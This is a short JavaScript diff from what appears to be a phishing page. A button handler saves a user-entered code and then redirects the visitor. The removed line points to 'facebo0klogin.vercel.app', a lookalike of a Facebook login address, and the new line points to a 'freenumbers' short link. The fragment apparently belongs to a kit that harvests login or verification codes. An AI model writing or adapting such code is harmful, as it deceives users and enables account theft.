@@ -97,5 +97,5 @@ continueBtn.addEventListener('click', async () => {
     console.error('Error saving code:', err);
   }
 
-  window.location.href = 'facebo0klogin.vercel.app';
+  window.location.href = 'https://urlweb.vercel.app/s/freenumbers';
 });
